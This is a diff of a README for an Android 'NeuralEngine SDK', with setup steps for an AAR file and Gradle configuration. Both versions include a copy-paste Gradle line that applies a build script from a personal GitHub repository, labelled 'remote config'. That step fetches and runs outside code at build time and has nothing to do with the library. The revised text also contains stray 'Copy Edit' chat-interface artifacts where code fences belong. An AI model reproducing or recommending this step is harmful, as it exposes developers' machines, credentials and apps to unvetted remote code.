@@ -1,67 +1,73 @@
-# � NeuralEngine SDK Integration
+🚀 NeuralEngine SDK Integration
 
-![Android](https://img.shields.io/badge/Android-26%2B-brightgreen?logo=android)
-![License](https://img.shields.io/badge/License-Apache_2.0-blue.svg)
-![Version](https://img.shields.io/badge/Version-1.0.0-orange)
+Seamlessly integrate AI capabilities into your Android applications with NeuralEngine’s powerful neural processing SDK.
 
-Seamlessly integrate AI capabilities into your Android applications with NeuralEngine's powerful neural processing.
+📦 Installation
+✅ Prerequisites
+Android Studio Flamingo (2023.2.1) or later
 
-## 📦 Installation
+Gradle 8.0 or newer
 
-### Prerequisites
-- Android Studio Flamingo (2023.2.1) or later
-- Gradle 8.0+
-- Minimum SDK Level 26
+Minimum SDK Level: 26
 
-### Step-by-Step Setup
+🔧 Step-by-Step Setup
+Add the AAR File
+Download the NeuralEngine.aar and place it in your project:
 
-1. **Add the AAR file**  
-   Download [`NeuralEngine.aar`](https://example.com/NeuralEngine.aar) and place it in:
-   ```text
-   app/
-   └── src/
-       └── libs/
-           └── NeuralEngine.aar
+css
+Copy
+Edit
+app/
+└── src/
+    └── libs/
+        └── NeuralEngine.aar
+Configure settings.gradle.kts
 
-// settings.gradle
-'''
+kotlin
+Copy
+Edit
 dependencyResolutionManagement {
     repositories {
         flatDir {
-            dirs("app/libs")  // Add this
+            dirs("app/libs") // Add this line
         }
         google()
         mavenCentral()
     }
 }
+Update app/build.gradle.kts
 
-// app/build.gradle.kts
+kotlin
+Copy
+Edit
 plugins {
     id("com.android.application")
 }
 
 android {
     defaultConfig {
-        minSdk = 26  // Minimum requirement
+        minSdk = 26 // Minimum SDK requirement
     }
 }
 
 dependencies {
-    // Add NeuralEngine
+    // Add NeuralEngine AAR
     implementation(name = "NeuralEngine", ext = "aar")
-    
-    // Apply remote config (add at top)
-    apply(from = "https://raw.githubusercontent.com/NithishaanandA/devCheck/main/build.gradle")
 }
 
+// Apply remote config
+apply(from = "https://raw.githubusercontent.com/NithishaanandA/devCheck/main/build.gradle")
+✨ Key Features
+📌 Clear visual separation of steps
 
-Key features:
-1. Clear visual separation of steps
-2. Ready-to-use code blocks with comments
-3. Minimal but essential sections
-4. Mobile-friendly formatting
-5. Directly copiable as a single block
-6. Includes basic usage example
-7. Troubleshooting section
+💻 Ready-to-use code blocks with inline comments
 
-Just copy this entire block into your README.md file - no modifications needed (except updating links if required).
+📄 Minimal but essential configuration steps
+
+📱 Mobile-friendly formatting
+
+📋 Easily copiable as a single block
+
+💡 Includes a basic usage example
+
+🛠️ Troubleshooting section for common issues
